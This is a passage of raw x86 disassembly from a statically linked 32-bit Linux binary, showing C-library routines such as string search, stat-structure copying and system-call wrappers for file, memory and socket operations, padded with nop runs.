add edi, ecx
jae 0x80539a9
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539a9
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539a9
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539a9
mov ecx, dword [eax + 0xc]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539a6
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539a6
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539a6
xor edi, ecx
or edi, 0xfefefeff
inc edi
je 0x80538d0
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x80539cd
cmp cl, dl
je 0x80539cd
inc eax
test ch, ch
je 0x80539cd
cmp ch, dl
je 0x80539cd
inc eax
shr ecx, 0x10
test cl, cl
je 0x80539cd
cmp cl, dl
je 0x80539cd
inc eax
pop edi
ret
nop
push ebp
mov ebp, esp
shl dword [arg_10h], 2
leave
jmp fcn.08053740
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
lea ecx, [var_4h]
mov dword [esp], ecx
mov dword [var_sp_4h], 0
lea ecx, [var_8h]
call fcn.08056f50
xor edx, edx
sub esp, 8
test eax, eax
jne 0x8053a3b
mov edx, dword [var_4h]
cmp edx, 1
ja 0x8053a40
mov eax, dword [arg_10h]
mov dword [eax], edx
mov edx, dword [var_8h]
mov eax, edx
leave
ret
nop
mov eax, dword [var_8h]
call fcn.08057110
mov dword [var_8h], 0
jmp 0x8053a38
jmp fcn.08053a60
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov dword [var_10h], eax
mov eax, 0
test eax, eax
je 0x8053a81
mov dword [esp], 0x80aacb0
call section.
mov eax, dword [var_10h]
mov ecx, dword [eax + 0x14]
test ecx, ecx
jne 0x8053bc2
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
mov dword [var_18h], eax
je 0x8053bb8
mov edx, dword [var_10h]
mov ecx, dword [var_10h]
mov eax, 0x80a4f11
xor edi, edi
mov edx, dword [edx + 0x5c]
mov ecx, dword [ecx + 0x1c]
mov dword [var_14h], edx
mov ebx, edx
test ecx, ecx
mov edx, 0x8092de3
mov dword [var_1ch], ecx
cmove edx, eax
mov dword [esp], edx
call fcn.08053400
mov dword [var_20h], eax
movzx ecx, byte [ebx]
test cl, cl
je 0x8053af1
mov edx, ecx
nop
inc ebx
lea eax, [edi + 1]
cmp dl, 0x2f
movzx edx, byte [ebx]
cmove edi, eax
test dl, dl
jne 0x8053ae0
sub ebx, dword [var_14h]
mov edx, dword [var_20h]
lea eax, [edx + ebx + 0x15]
mov ebx, dword [var_14h]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
and eax, 0xfffffff0
test cl, cl
mov dword [var_24h], eax
mov esi, eax
je 0x8053b30
movzx edx, byte [ebx]
mov eax, dword [0x80a99fc]
movsx edx, dl
mov ecx, esi
inc ebx
inc esi
mov eax, dword [eax + edx*4]
mov byte [ecx], al
movzx eax, byte [ebx]
test al, al
mov edx, eax
jne 0x8053b16
cmp edi, 1
ja 0x8053b70
mov byte [esi], 0x2f
inc esi
test edi, edi
jne 0x8053b70
mov byte [esi], 0x2f
mov edx, dword [var_20h]
inc esi
test edx, edx
je 0x8053b70
mov edx, dword [var_20h]
mov eax, dword [var_1ch]
mov dword [esp], esi
test eax, eax
mov dword [var_8h], edx
mov eax, 0x80a4f11
mov edx, 0x8092de3
cmove edx, eax
mov dword [var_4h], edx
call fcn.08053740
mov esi, eax
nop
mov byte [esi], 0
mov dword [esp], 0x8093633
mov ecx, dword [var_24h]
mov eax, dword [var_18h]
mov dword [var_4h], ecx
add eax, 4
mov dword [var_8h], eax
call fcn.08053a00
mov edx, dword [var_18h]
mov dword [edx], eax
xor edx, edx
test eax, eax
jne 0x8053bfb
mov eax, dword [var_18h]
test edx, edx
mov dword [eax + 8], edx
jne 0x8053be9
mov edx, eax
mov eax, dword [eax]
test eax, eax
jne 0x8053bdf
mov eax, dword [var_18h]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [var_10h]
mov dword [edx + 0x14], 0x8092dec
mov eax, 0
test eax, eax
je 0x8053bd7
mov dword [esp], 0x80aacb0
call section.
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [edx + 4]
call fcn.08057110
jmp 0x8053bad
mov ecx, dword [var_10h]
mov eax, dword [var_18h]
mov dword [ecx + 0x10], 0x8053d30
mov dword [ecx + 0x14], eax
jmp 0x8053bc2
mov eax, dword [var_18h]
mov ecx, dword [var_24h]
mov dword [var_4h], 0x8093633
add eax, 0xc
mov dword [esp], ecx
mov dword [var_8h], eax
call fcn.08053a00
mov edx, eax
jmp 0x8053b9b
nop
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, eax
mov eax, 0
test eax, eax
je 0x8053c9a
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8053c81
mov ecx, eax
mov edx, dword [ecx]
mov dword [esi], edx
mov eax, dword [ecx + 4]
mov dword [esi + 4], eax
mov eax, dword [ecx + 8]
mov dword [esi + 8], eax
mov eax, dword [ecx + 0xc]
mov dword [esi + 0xc], eax
mov eax, dword [edx]
test eax, eax
je 0x8053c6d
inc dword [edx + 8]
mov eax, dword [esi + 8]
mov ebx, dword [eax]
test ebx, ebx
je 0x8053c79
inc dword [eax + 8]
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
cmp ebx, 0x809ff60
mov ecx, 0x8092dec
je 0x8053c4e
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8053c4c
mov eax, dword [0x80a9ab4]
jmp 0x8053c43
jmp fcn.08053cb0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_8h], ebx
mov dword [var_4h], edx
mov dword [esp], 0x8093633
mov ebx, eax
mov dword [var_bp_4h], esi
lea eax, [eax + 4]
mov esi, edx
mov dword [var_sp_8h], eax
call fcn.08053a00
test eax, eax
mov dword [ebx], eax
jne 0x8053d00
mov ecx, dword [ebx]
xor eax, eax
test ecx, ecx
je 0x8053cec
mov edx, dword [ebx + 8]
test edx, edx
jne 0x8053cf1
mov eax, 1
mov ebx, dword [var_8h]
mov esi, dword [var_bp_4h]
leave
ret
lea esi, [esi]
lea eax, [ebx + 0xc]
mov dword [var_4h], 0x8093633
mov dword [esp], esi
mov dword [var_sp_8h], eax
call fcn.08053a00
test eax, eax
mov dword [ebx + 8], eax
jne 0x8053cdd
mov edx, dword [ebx + 4]
mov eax, dword [ebx]
call fcn.08057110
jmp 0x8053cdd
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [eax + 0x14]
test ebx, ebx
je 0x8053d6b
mov dword [eax + 0x14], 0
mov dword [eax + 0x10], 0
mov edx, dword [ebx + 0xc]
mov eax, dword [ebx + 8]
call fcn.08057110
mov eax, dword [ebx]
mov edx, dword [ebx + 4]
call fcn.08057110
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_4h]
leave
ret
mov edx, ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_4h]
mov eax, 0x4e
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
mov ebx, dword [arg_4h]
mov eax, 0xfc
int 0x80
mov eax, 1
int 0x80
hlt
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax, 0x14
int 0x80
ret
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x5c
mov eax, dword [0x80aad2c]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_ch]
mov esi, dword [arg_10h]
test eax, eax
jne 0x8053e44
call fcn.08048b20
mov ecx, esi
mov dword [var_50h], eax
mov edi, dword [eax]
mov eax, 0xc5
int 0x80
cmp eax, 0xfffff000
ja 0x8053e86
cmp eax, 0xffffffff
mov edx, eax
je 0x8053e2d
test edx, edx
jne 0x8053e20
mov eax, dword [esi + 0x58]
cmp dword [esi + 0xc], eax
je 0x8053e20
mov eax, dword [esi + 0xc]
mov dword [esi + 0x5c], 0
mov dword [esi + 0x58], eax
lea esi, [esi]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
mov ecx, dword [var_50h]
cmp dword [ecx], 0x26
jne 0x8053e03
mov edx, dword [var_50h]
mov dword [edx], edi
mov dword [0x80aad2c], 1
lea edi, [var_4ch]
mov ecx, edi
mov eax, 0x6c
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x8053e76
test ebx, ebx
mov edx, ebx
jne 0x8053e20
mov eax, dword [arg_8h]
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], edi
mov dword [esp], eax
call fcn.08054430
mov edx, eax
jmp 0x8053e20
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x8053e59
mov edx, dword [var_50h]
neg eax
mov dword [edx], eax
mov eax, 0xffffffff
jmp 0x8053dfc
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov edx, ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_4h]
mov eax, 0xf
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
cmp dword [0x80aa844], 0
jne 0x8053eea
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 5
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
call fcn.08054950
push eax
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 5
int 0x80
pop ebx
xchg dword [esp], eax
call fcn.080549a0
pop eax
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
nop
nop
nop
nop
nop
cmp dword [0x80aa844], 0
jne 0x8053f44
mov edx, ebx
mov ebx, dword [arg_4h]
mov eax, 6
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
call fcn.08054950
mov ecx, eax
mov edx, ebx
mov ebx, dword [arg_4h]
mov eax, 6
int 0x80
mov ebx, edx
push eax
mov eax, ecx
call fcn.080549a0
pop eax
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
cmp dword [0x80aa844], 0
jne 0x8053f9a
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 3
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
call fcn.08054950
push eax
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 3
int 0x80
pop ebx
xchg dword [esp], eax
call fcn.080549a0
pop eax
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
nop
nop
nop
nop
nop
cmp dword [0x80aa844], 0
jne 0x8053ffa
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 4
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
call fcn.08054950
push eax
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 4
int 0x80
pop ebx
xchg dword [esp], eax
call fcn.080549a0
pop eax
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x40
mov edx, dword [0x80aabf0]
mov eax, dword [arg_10h]
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_ch]
test edx, edx
mov dword [var_30h], eax
jne 0x80540a2
mov ebx, dword [arg_8h]
mov ecx, edi
mov edx, eax
mov eax, 0xdd
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x805422e
test esi, esi
js 0x805408e
mov eax, esi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
call fcn.08048b20
cmp dword [eax], 0x26
jne 0x8054081
mov dword [0x80aabf0], 1
cmp edi, 0xc
je 0x805416b
jl 0x805415a
cmp edi, 0xe
jg 0x805415a
mov ebx, dword [var_30h]
mov esi, dword [var_30h]
mov eax, dword [ebx + 4]
mov edx, dword [esi + 8]
mov ecx, eax
mov ebx, eax
mov dword [var_28h], eax
mov eax, dword [esi + 4]
sar ebx, 0x1f
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054145
mov edx, dword [var_30h]
mov eax, dword [edx + 0xc]
mov ecx, eax
mov ebx, eax
mov dword [var_24h], eax
mov eax, dword [edx + 0xc]
sar ebx, 0x1f
mov edx, dword [edx + 0x10]
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054145
mov edx, dword [var_30h]
lea ecx, [edi - 7]
mov ebx, dword [arg_8h]
movzx eax, word [edx]
mov word [var_2ch], ax
movzx eax, word [edx + 2]
mov word [var_2ah], ax
mov eax, dword [edx + 0x14]
lea edx, [var_2ch]
mov dword [var_20h], eax
mov eax, 0x37
int 0x80
cmp eax, 0xfffff000
mov esi, eax
jbe 0x8054081
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x8054081
call fcn.08048b20
mov dword [eax], 0x4b
mov eax, 0xffffffff
jmp 0x8054083
mov ebx, dword [arg_8h]
mov ecx, edi
mov edx, dword [var_30h]
mov eax, 0x37
int 0x80
jmp 0x8054125
mov esi, dword [var_30h]
mov eax, dword [esi + 4]
mov edx, dword [esi + 8]
mov ecx, eax
mov ebx, eax
mov dword [var_18h], eax
mov eax, dword [esi + 4]
sar ebx, 0x1f
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054145
mov edx, dword [var_30h]
mov eax, dword [edx + 0xc]
mov ecx, eax
mov ebx, eax
mov dword [var_14h], eax
mov eax, dword [edx + 0xc]
sar ebx, 0x1f
mov edx, dword [edx + 0x10]
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054145
mov edx, dword [var_30h]
mov ecx, 5
mov ebx, dword [arg_8h]
movzx eax, word [edx]
mov word [var_1ch], ax
movzx eax, word [edx + 2]
mov word [var_1ah], ax
mov eax, dword [edx + 0x14]
lea edx, [var_1ch]
mov dword [var_10h], eax
mov eax, 0x37
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x805421e
test esi, esi
mov eax, esi
jne 0x8054083
mov esi, dword [var_30h]
mov eax, dword [var_1ch]
mov word [esi], ax
movzx eax, word [var_1ah]
mov word [esi + 2], ax
mov eax, dword [var_18h]
cdq
mov dword [esi + 4], eax
mov eax, dword [var_14h]
mov dword [esi + 8], edx
mov ecx, eax
mov dword [esi + 0xc], eax
mov eax, dword [var_10h]
sar ecx, 0x1f
mov dword [esi + 0x10], ecx
mov dword [esi + 0x14], eax
xor eax, eax
jmp 0x8054083
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x80541de
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x805407d
jmp fcn.08054250
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x1c
mov ecx, dword [0x80aa844]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov esi, dword [arg_8h]
mov ebx, dword [arg_10h]
test ecx, ecx
mov edi, dword [arg_ch]
jne 0x805428d
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], edi
mov dword [esp], esi
call fcn.08054040
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
cmp edi, 7
je 0x8054297
cmp edi, 0xe
jne 0x8054272
call fcn.08054950
mov dword [esp], esi
mov dword [var_sp_4h], edi
mov dword [var_sp_8h], ebx
mov dword [var_10h], eax
call fcn.08054040
mov ebx, eax
mov eax, dword [var_10h]
call fcn.080549a0
mov eax, ebx
jmp 0x8054282
nop
nop
nop
mov edx, ebx
mov ebx, dword [arg_4h]
mov eax, 0x29
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_8h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
cmp eax, 1
je 0x80543c2
cmp eax, 3
jne 0x80543b0
movzx eax, word [ebx]
mov dword [ecx + 4], 0
mov dword [ecx + 0x24], 0
mov word [ecx + 8], 0
mov dword [ecx], eax
mov eax, dword [ebx + 4]
mov dword [ecx + 0xc], eax
movzx eax, word [ebx + 8]
mov dword [ecx + 0x10], eax
movzx eax, word [ebx + 0xa]
mov dword [ecx + 0x14], eax
movzx eax, word [ebx + 0xc]
mov dword [ecx + 0x18], eax
movzx eax, word [ebx + 0xe]
mov dword [ecx + 0x1c], eax
movzx eax, word [ebx + 0x10]
mov word [ecx + 0x28], 0
mov dword [ecx + 0x20], eax
mov eax, dword [ebx + 0x14]
mov dword [ecx + 0x2c], eax
mov eax, dword [ebx + 0x18]
mov dword [ecx + 0x30], eax
mov eax, dword [ebx + 0x1c]
mov dword [ecx + 0x34], eax
mov eax, dword [ebx + 0x20]
mov dword [ecx + 0x38], eax
mov eax, dword [ebx + 0x24]
mov dword [ecx + 0x3c], eax
mov eax, dword [ebx + 0x28]
mov dword [ecx + 0x40], eax
mov eax, dword [ebx + 0x2c]
mov dword [ecx + 0x44], eax
mov eax, dword [ebx + 0x30]
mov dword [ecx + 0x48], eax
mov eax, dword [ebx + 0x34]
mov dword [ecx + 0x54], 0
mov dword [ecx + 0x50], 0
mov dword [ecx + 0x4c], eax
xor eax, eax
pop ebx
leave
ret
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x80543ad
mov eax, dword [ebx]
mov dword [ecx], eax
mov eax, dword [ebx + 4]
mov dword [ecx + 4], eax
mov eax, dword [ebx + 8]
mov dword [ecx + 8], eax
mov eax, dword [ebx + 0xc]
mov dword [ecx + 0xc], eax
mov eax, dword [ebx + 0x10]
mov dword [ecx + 0x10], eax
mov eax, dword [ebx + 0x14]
mov dword [ecx + 0x14], eax
mov eax, dword [ebx + 0x18]
mov dword [ecx + 0x18], eax
mov eax, dword [ebx + 0x1c]
mov dword [ecx + 0x1c], eax
mov eax, dword [ebx + 0x20]
mov dword [ecx + 0x20], eax
mov eax, dword [ebx + 0x24]
mov dword [ecx + 0x24], eax
mov eax, dword [ebx + 0x28]
mov dword [ecx + 0x28], eax
mov eax, dword [ebx + 0x2c]
mov dword [ecx + 0x2c], eax
mov eax, dword [ebx + 0x30]
mov dword [ecx + 0x30], eax
mov eax, dword [ebx + 0x34]
mov dword [ecx + 0x34], eax
mov eax, dword [ebx + 0x38]
mov dword [ecx + 0x38], eax
mov eax, dword [ebx + 0x3c]
mov dword [ecx + 0x3c], eax
jmp 0x80543ab
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_8h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
cmp eax, 1
je 0x8054447
cmp eax, 3
je 0x805445c
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
mov ebx, dword [esp]
leave
ret
movzx eax, word [ebx]
mov dword [ecx + 4], 0
mov dword [ecx + 8], 0
mov dword [ecx + 0x5c], 0
mov dword [ecx + 0x24], 0
mov dword [ecx + 0x28], 0
mov dword [ecx + 0x30], 0
mov dword [ecx + 0x3c], 0
mov dword [ecx], eax
mov eax, dword [ebx + 4]
mov dword [ecx + 0xc], eax
mov dword [ecx + 0x58], eax
movzx eax, word [ebx + 8]
mov dword [ecx + 0x10], eax
movzx eax, word [ebx + 0xa]
mov dword [ecx + 0x14], eax
movzx eax, word [ebx + 0xc]
mov dword [ecx + 0x18], eax
movzx eax, word [ebx + 0xe]
mov dword [ecx + 0x1c], eax
movzx eax, word [ebx + 0x10]
mov dword [ecx + 0x20], eax
mov eax, dword [ebx + 0x14]
mov dword [ecx + 0x2c], eax
mov eax, dword [ebx + 0x18]
mov dword [ecx + 0x34], eax
mov eax, dword [ebx + 0x1c]
mov dword [ecx + 0x38], eax
mov eax, dword [ebx + 0x20]
mov dword [ecx + 0x40], eax
mov eax, dword [ebx + 0x24]
mov dword [ecx + 0x44], eax
mov eax, dword [ebx + 0x28]
mov dword [ecx + 0x48], eax
mov eax, dword [ebx + 0x2c]
mov dword [ecx + 0x4c], eax
mov eax, dword [ebx + 0x30]
mov dword [ecx + 0x50], eax
mov eax, dword [ebx + 0x34]
mov dword [ecx + 0x54], eax
xor eax, eax
jmp 0x8054457
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
mov eax, dword [arg_8h]
push esi
mov edi, dword [arg_10h]
push ebx
cmp eax, 1
je 0x8054516
cmp eax, 3
je 0x805452b
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_ch]
mov word [edi + 8], 0
mov edx, dword [ecx + 4]
mov eax, dword [ecx]
mov dword [edi + 4], edx
mov dword [edi], eax
mov esi, dword [ecx + 0x5c]
mov ebx, dword [ecx + 0x58]
mov edx, esi
or edx, ebx
jne 0x8054612
mov eax, dword [ecx + 0xc]
mov dword [edi + 0xc], eax
mov ecx, dword [arg_ch]
mov word [edi + 0x28], 0
mov eax, dword [ecx + 0x10]
mov edx, dword [ecx + 0x24]
mov esi, ecx
mov dword [edi + 0x10], eax
mov eax, dword [ecx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [ecx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [ecx + 0x1c]
mov dword [edi + 0x1c], eax
mov eax, dword [ecx + 0x20]
mov dword [edi + 0x24], edx
mov dword [edi + 0x20], eax
mov edx, dword [esi + 0x30]
mov eax, dword [ecx + 0x2c]
mov ecx, eax
mov ebx, eax
mov dword [edi + 0x2c], eax
mov eax, dword [esi + 0x2c]
sar ebx, 0x1f
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054602
mov edx, dword [arg_ch]
mov eax, dword [edx + 0x34]
mov dword [edi + 0x30], eax
mov eax, dword [edx + 0x38]
mov ecx, eax
mov ebx, eax
mov dword [edi + 0x34], eax
mov eax, dword [edx + 0x38]
sar ebx, 0x1f
mov edx, dword [edx + 0x3c]
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8054602
mov edx, dword [arg_ch]
mov eax, dword [edx + 0x40]
mov dword [edi + 0x38], eax
mov eax, dword [edx + 0x44]
mov dword [edi + 0x3c], eax
mov eax, dword [edx + 0x48]
mov dword [edi + 0x40], eax
mov eax, dword [edx + 0x4c]
mov dword [edi + 0x44], eax
mov eax, dword [edx + 0x50]
mov dword [edi + 0x48], eax
mov eax, dword [edx + 0x54]
mov dword [edi + 0x54], 0
mov dword [edi + 0x50], 0
mov dword [edi + 0x4c], eax
xor eax, eax
jmp 0x8054526
call fcn.08048b20
mov dword [eax], 0x4b
jmp 0x8054521
mov edx, dword [arg_ch]
mov eax, dword [edx + 0x58]
xor edx, edx
mov ecx, edx
xor ecx, esi
mov dword [edi + 0xc], eax
mov eax, dword [edi + 0xc]
xor eax, ebx
or ecx, eax
je 0x8054554
jmp 0x8054602
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [0x80aa9dc]
mov esi, dword [arg_8h]
test ebx, ebx
je 0x8054662
mov eax, dword [0x80a95f8]
test eax, eax
je 0x805467d
mov dword [esp], 0
call fcn.08079fe0
mov edx, 0xffffffff
test eax, eax
js 0x8054683
mov ebx, dword [0x80aa9dc]
test esi, esi
mov edx, ebx
jne 0x805468d
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
mov eax, edx
leave
ret
lea eax, [esi + ebx]
mov dword [esp], eax
call fcn.08079fe0
mov edx, 0xffffffff
test eax, eax
cmovns edx, ebx
jmp 0x8054683
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov edx, dword [0x80aac74]
push ebp
mov eax, 0x1000
mov ebp, esp
leave
test edx, edx
cmovne eax, edx
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov edx, ebx
mov eax, 0x5a
lea ebx, [arg_4h]
int 0x80
mov ebx, edx
cmp eax, 0xfffff000
ja fcn.080564b0
ret
nop
nop
nop
nop
nop
push ebp
push ebx
push esi
push edi
mov edx, dword [arg_28h]
mov ecx, dword [arg_2ch]
test edx, 0xfff
jne 0x805473f
shrd edx, ecx, 0xc
shr ecx, 0xc
jne 0x805473f
mov ebp, edx
mov ebx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov edx, dword [arg_1ch]
mov esi, dword [arg_20h]
mov edi, dword [arg_24h]
mov eax, 0xc0
int 0x80
pop edi
pop esi
pop ebx
pop ebp
cmp eax, 0xffffffda
je 0x805474d
cmp eax, 0xfffff000
ja fcn.080564b0
ret
pop edi
pop esi
pop ebx
pop ebp
mov eax, 0xffffffea
jmp fcn.080564b0
mov edx, ebx
cmp dword [arg_2ch], 0
jne 0x805476f
mov eax, 0x5a
lea ebx, [arg_14h]
int 0x80
mov ebx, edx
cmp eax, 0xfffff000
ja fcn.080564b0
ret
mov ebx, edx
mov eax, 0xffffffea
jmp fcn.080564b0
nop
nop
nop
nop
nop
mov edx, ebx
mov ecx, dword [esp + 8]
mov ebx, dword [var_sp_8h]
mov eax, 0x5b
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x7d
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
mov esi, dword [var_ch]
test esi, esi
je 0x805480a
mov ebx, dword [esi]
test ebx, ebx
je 0x805480a
mov dword [var_sp_4h], 0x2f
mov dword [esp], ebx
call fcn.08077060
test eax, eax
je 0x8054812
inc eax
mov dword [0x80a95a0], eax
mov eax, dword [esi]
mov dword [0x80a959c], eax
mov ebx, dword [var_8h_2]
mov esi, dword [var_4h_2]
leave
ret
mov dword [0x80a95a0], ebx
jmp 0x8054803
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x1c
mov edx, dword [arg_10h]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
lea esi, [var_14h]
mov edi, dword [arg_14h]
mov ecx, edx
mov edx, dword [arg_ch]
mov eax, 0x8c
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x805488a
test esi, esi
je 0x8054882
mov eax, esi
cdq
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov eax, dword [var_14h]
mov edx, dword [var_10h]
jmp 0x8054877
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x8054870
nop
nop
nop
nop
nop
nop
push esi
push ebx
mov esi, dword [arg_18h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 0xa3
int 0x80
pop ebx
pop esi
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
cmp dword [0x80aa844], 0
jne 0x80548f7
mov edx, ebx
mov eax, 0x66
mov ebx, 0xb
lea ecx, [arg_8h]
int 0x80
mov ebx, edx
cmp eax, 0xffffff83
jae fcn.080564b0
ret
push esi
call fcn.08054950
mov esi, eax
mov edx, ebx
mov eax, 0x66
mov ebx, 0xb
lea ecx, [arg_8h]
int 0x80
mov ebx, edx
xchg esi, eax
call fcn.080549a0
mov eax, esi
pop esi
cmp eax, 0xffffff83
jae fcn.080564b0
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov edx, ebx
mov eax, 0x66
mov ebx, 1
lea ecx, [arg_4h]
int 0x80
mov ebx, edx
cmp eax, 0xffffff83
jae fcn.080564b0
ret
nop
nop
push ebp
mov ebp, esp
sub esp, 8
call section.
cmp byte [eax + 0x82], 0
movsx edx, byte [eax + 0x81]
mov byte [eax + 0x81], 1
jne 0x8054976
mov eax, edx
